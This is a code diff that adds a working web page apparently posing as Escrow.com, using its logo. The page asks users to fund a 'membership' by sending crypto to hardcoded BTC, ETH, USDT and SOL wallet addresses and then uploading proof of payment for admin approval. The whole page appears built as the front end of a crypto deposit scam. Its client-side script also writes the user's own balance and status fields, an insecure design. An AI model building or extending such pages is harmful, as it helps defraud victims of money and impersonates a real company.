@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Escrow Funding</title>
+
+<link rel="stylesheet" href="alert-system.css">
+
+<style>
+
+/* =========================
+RESET
+========================= */
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+
+body{
+
+background:#f4f7fb;
+
+font-family:Arial,sans-serif;
+
+min-height:100vh;
+
+}
+
+/* =========================
+TOP BAR
+========================= */
+
+.top-bar{
+
+height:70px;
+
+background:linear-gradient(
+180deg,
+#01466F 0%,
+#01426A 100%
+);
+
+display:flex;
+
+align-items:center;
+
+justify-content:center;
+
+padding:0 20px;
+
+}
+
+.logo{
+
+width:190px;
+
+filter:brightness(0) invert(1);
+
+}
+
+/* =========================
+PAGE
+========================= */
+
+.container{
+
+max-width:500px;
+
+margin:30px auto;
+
+padding:0 16px;
+
+}
+
+/* =========================
+CARD
+========================= */
+
+.card{
+
+background:#fff;
+
+border-radius:18px;
+
+padding:24px;
+
+box-shadow:0 10px 30px rgba(0,0,0,.08);
+
+margin-bottom:20px;
+
+}
+
+.card h2{
+
+margin-bottom:20px;
+
+font-size:24px;
+
+}
+
+.card h3{
+
+margin-bottom:18px;
+
+font-size:18px;
+
+}
+
+/* =========================
+SUMMARY
+========================= */
+
+.summary-row{
+
+display:flex;
+
+justify-content:space-between;
+
+padding:14px 0;
+
+border-bottom:1px solid #eee;
+
+}
+
+.summary-row:last-child{
+
+border:none;
+
+}
+
+.summary-label{
+
+color:#777;
+
+}
+
+.summary-value{
+
+font-weight:700;
+
+}
+
+/* =========================
+WALLET
+========================= */
+
+.wallet-box {
+  
+  margin-top: 25px;
+  
+}
+
+.wallet-box h3 {
+  
+  margin-bottom: 12px;
+  
+  font-size: 18px;
+  
+}
+
+.wallet-row {
+  
+  display: flex;
+  
+  gap: 10px;
+  
+}
+
+.wallet-row input {
+  
+  flex: 1;
+  
+  height: 55px;
+  
+  border: none;
+  
+  border-radius: 12px;
+  
+  background: #f4f7fa;
+  
+  padding: 0 15px;
+  
+  font-size: 14px;
+  
+  color: #333;
+  
+}
+
+#copyBtn {
+  
+  width: 100px;
+  
+  border: none;
+  
+  border-radius: 12px;
+  
+  background: #00548C;
+  
+  color: #fff;
+  
+  font-weight: 700;
+  
+  cursor: pointer;
+  
+}
+
+
+
+/* =========================
+INSTRUCTIONS
+========================= */
+
+.instructions{
+
+line-height:1.8;
+
+color:#555;
+
+}
+
+.instructions p{
+
+margin-bottom:10px;
+
+}
+
+/* =========================
+UPLOAD
+========================= */
+
+.upload-box{
+
+margin-top:18px;
+
+}
+
+.upload-box input{
+
+width:100%;
+
+margin-top:10px;
+
+}
+
+/* =========================
+BUTTON
+========================= */
+
+.complete-btn{
+
+width:100%;
+
+height:55px;
+
+border:none;
+
+border-radius:12px;
+
+background:#3DBB57;
+
+color:#fff;
+
+font-size:16px;
+
+font-weight:700;
+
+cursor:pointer;
+
+}
+
+.complete-btn:hover{
+
+opacity:.9;
+
+}
+
+/* =========================
+MOBILE
+========================= */
+
+@media(max-width:768px){
+
+.card{
+
+padding:20px;
+
+}
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<header class="top-bar">
+
+<img
+src="https://upload.wikimedia.org/wikipedia/commons/8/84/Escrow_com_logo.png"
+class="logo"
+alt="Escrow">
+
+</header>
+
+<div class="container">
+
+<!-- FUNDING CARD -->
+
+<div class="card">
+
+<h2>Escrow Funding</h2>
+
+<p>
+
+Complete your escrow funding to activate your membership.
+
+</p>
+
+</div>
+
+<!-- MEMBERSHIP SUMMARY -->
+
+<div class="card">
+
+<h3>Membership Summary</h3>
+
+<div class="summary-row">
+
+<span class="summary-label">
+Membership Tier
+</span>
+
+<span
+class="summary-value"
+id="summaryTier">
+-
+</span>
+
+</div>
+
+<div class="summary-row">
+
+<span class="summary-label">
+Stablecoin
+</span>
+
+<span
+class="summary-value"
+id="summaryCoin">
+-
+</span>
+
+</div>
+
+<div class="summary-row">
+
+<span class="summary-label">
+Funding Amount
+</span>
+
+<span
+class="summary-value"
+id="summaryAmount">
+-
+</span>
+
+</div>
+
+</div>
+
+<!-- WALLET -->
+
+<div class="card">
+
+<h3>Escrow Wallet Address</h3>
+
+<div class="wallet-box">
+
+<h3>Deposit Address</h3>
+
+<div class="wallet-row">
+
+<input
+type="text"
+id="walletAddress"
+readonly>
+
+<button
+type="button"
+id="copyBtn">
+
+Copy
+
+</button>
+
+</div>
+
+</div>
+
+</div>
+
+<!-- INSTRUCTIONS -->
+
+<div class="card">
+
+<h3>Payment Instructions</h3>
+
+<div class="instructions">
+
+<p>
+
+1. Copy the wallet address.
+
+</p>
+
+<p>
+
+2. Send the exact amount.
+
+</p>
+
+<p>
+
+3. Wait for confirmation.
+
+</p>
+
+<p>
+
+4. Upload proof of payment.
+
+</p>
+
+</div>
+
+</div>
+
+<!-- UPLOAD -->
+
+<div class="card">
+
+<h3>Upload Payment Proof</h3>
+
+<div class="upload-box">
+
+<input
+type="file"
+id="proofUpload"
+accept="image/*,.pdf">
+
+</div>
+
+</div>
+
+<!-- BUTTON -->
+
+<button
+id="completeFunding"
+class="complete-btn">
+
+Complete Funding
+
+</button>
+
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<script src="supabase.js"></script>
+
+<script src="alert-system.js"></script>
+
+<script>
+
+const copyBtn = document.getElementById("copyBtn");
+
+copyBtn.addEventListener("click", () => {
+  const address = document.getElementById("walletAddress");
+  try {
+    address.removeAttribute("readonly");
+    address.select();
+    address.setSelectionRange(0, 99999);
+    document.execCommand("copy");
+    address.setAttribute("readonly", true);
+    copyBtn.textContent = "Copied ✓";
+    setTimeout(() => {
+      copyBtn.textContent = "Copy";
+    }, 2000);
+  } catch (error) {
+    alert("Unable to copy address.");
+  }
+});
+
+const walletAddresses = {
+  BTC: "bc1qdmdth3gtyduzgxmpkxls3enchjnpm3w6h3gx0m",
+  ETH: "0x9446fcc5e58c53bb3ffB0f722E6078582Cc9aB38",
+  "USDT (ton)": "TRNNxUv2QYezdA63AsjKDNfXYjNmoxrmFH",
+  USDT: "TRNNxUv2QYezdA63AsjKDNfXYjNmoxrmFH",
+  SOL: "CBcE3FUhKUauxxL5PAEGiwwCECTh4V3SEzQaankU3KfR"
+};
+
+// Timeout helper – stops endless freezing
+function withTimeout(promise, ms = 10000) {
+  const timeout = new Promise((_, reject) =>
+    setTimeout(() => reject(new Error("Request timed out. Please refresh the page.")), ms)
+  );
+  return Promise.race([promise, timeout]);
+}
+
+// =========================
+// SAFE PAGE LOAD
+// =========================
+async function loadUserData() {
+  try {
+    // 1. Get current user (with timeout)
+    const { data: { user }, error: userError } = await withTimeout(
+      supabaseClient.auth.getUser()
+    );
+
+    if (userError || !user) {
+      console.log("No user found → redirecting to login");
+      window.location.href = "login.html";
+      return;
+    }
+
+    // 2. Get profile (with timeout)
+    const { data: profile, error: profileError } = await withTimeout(
+      supabaseClient
+        .from("users")
+        .select("*")
+        .eq("id", user.id)
+        .maybeSingle()
+    );
+
+    if (profileError) {
+      console.error(profileError);
+      alert("Failed to load your profile. Please try again.");
+      return;
+    }
+
+    if (!profile) {
+      alert("No profile found for this account. Please contact support.");
+      return;
+    }
+
+    // 3. Fill the page
+    document.getElementById("summaryTier").textContent = profile.tier || "-";
+    document.getElementById("summaryCoin").textContent = profile.coin || "-";
+    document.getElementById("summaryAmount").textContent =
+      "$" + Number(profile.amount || 0).toLocaleString();
+
+    // Safe wallet lookup
+    const coinKey = profile.coin || "";
+    document.getElementById("walletAddress").value =
+      walletAddresses[coinKey] || walletAddresses["USDT"] || "";
+
+  } catch (err) {
+    console.error("Load error:", err);
+    alert(err.message || "Connection is slow. Please refresh the page.");
+  }
+}
+
+// Run when page opens
+loadUserData();
+
+// =========================
+// COMPLETE FUNDING (FIXED)
+// =========================
+document.getElementById("completeFunding").addEventListener("click", async () => {
+  const proofInput = document.getElementById("proofUpload");
+  const completeBtn = document.getElementById("completeFunding");
+
+  if (!proofInput.files || proofInput.files.length === 0) {
+    alert("Please upload proof of payment");
+    return;
+  }
+
+  const file = proofInput.files[0];
+  const fileExt = (file.name.split(".").pop() || "png").toLowerCase();
+
+  completeBtn.disabled = true;
+  completeBtn.textContent = "Submitting...";
+
+  try {
+    // 1. Get logged-in user
+    const { data: authData, error: userError } = await withTimeout(
+      supabaseClient.auth.getUser()
+    );
+
+    const user = authData?.user;
+
+    if (userError || !user || !user.id) {
+      alert("You must be logged in.");
+      window.location.href = "login.html";
+      return;
+    }
+
+    // 2. Build a clean, valid filename
+    const safeId = String(user.id).replace(/[^a-zA-Z0-9-]/g, "");
+    const fileName = safeId + "-" + Date.now() + "." + fileExt;
+
+    console.log("Uploading file as:", fileName);
+
+    // 3. Upload to storage
+    const { error: uploadError } = await withTimeout(
+      supabaseClient.storage
+        .from("payment-proofs")
+        .upload(fileName, file, {
+          cacheControl: "3600",
+          upsert: false
+        })
+    );
+
+    if (uploadError) {
+      console.error(uploadError);
+      alert(uploadError.message);
+      return;
+    }
+
+    // 4. Get public URL
+    const { data: urlData } = supabaseClient.storage
+      .from("payment-proofs")
+      .getPublicUrl(fileName);
+
+    const publicUrl = urlData?.publicUrl || "";
+
+    // 5. Get profile
+    const { data: profile, error: profileError } = await withTimeout(
+      supabaseClient
+        .from("users")
+        .select("*")
+        .eq("id", user.id)
+        .maybeSingle()
+    );
+
+    if (profileError || !profile) {
+      alert("Could not load profile.");
+      return;
+    }
+
+    // 6. Create contract number
+    const contractNumber =
+      profile.contract_number ||
+      ("ESC-" + Math.floor(10000 + Math.random() * 90000));
+
+    // 7. Update user record
+    const { error: updateError } = await withTimeout(
+      supabaseClient
+        .from("users")
+        .update({
+          balance: profile.amount || 0,
+          contract_number: contractNumber,
+          proof_url: publicUrl,
+          funding_status: "pending",
+          account_status: "Pending Funding",
+          approved: false,
+          current_milestone: 0
+        })
+        .eq("id", user.id)
+    );
+
+    if (updateError) {
+      console.error(updateError);
+      alert(updateError.message);
+      return;
+    }
+
+    alert(
+      "Your payment proof has been submitted successfully. Please wait for the administrator to review and approve your funding."
+    );
+
+    proofInput.disabled = true;
+    completeBtn.disabled = true;
+    completeBtn.textContent = "Awaiting Account Approval";
+
+  } catch (err) {
+    console.error(err);
+    alert(err.message || "Something went wrong. Please try again.");
+    completeBtn.disabled = false;
+    completeBtn.textContent = "Complete Funding";
+  }
+});
+
+</script>
+
+</body>
+
+</html>
